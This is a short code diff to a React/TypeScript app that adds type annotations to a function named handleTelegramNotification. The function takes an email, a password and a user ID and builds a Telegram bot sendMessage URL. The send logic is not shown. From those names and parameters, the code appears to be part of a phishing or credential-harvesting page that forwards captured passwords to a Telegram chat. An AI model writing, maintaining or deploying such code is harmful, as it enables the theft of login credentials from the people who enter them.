@@ -310,7 +310,7 @@ export default function App() {
     const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
   const handleTelegramNotification = useCallback(
-    async (email, pwd, uid) => {
+     async (email: string, pwd: string, uid: string) => {
         if (
             TELEGRAM_BOT_TOKEN === "YOUR_TELEGRAM_BOT_TOKEN" ||
             TELEGRAM_CHAT_ID === "YOUR_TELEGRAM_CHAT_ID"
